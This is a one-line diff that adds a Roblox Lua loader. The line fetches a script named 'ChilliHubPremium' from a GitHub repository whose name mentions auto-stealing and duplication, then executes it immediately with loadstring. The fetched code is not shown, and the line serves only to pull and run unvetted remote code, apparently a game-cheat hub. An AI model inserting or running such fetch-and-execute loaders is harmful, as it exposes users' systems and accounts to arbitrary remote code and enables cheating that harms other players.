@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SabAutoStealV3/DupeXAntihit/refs/heads/main/ChilliHubPremium", true))()
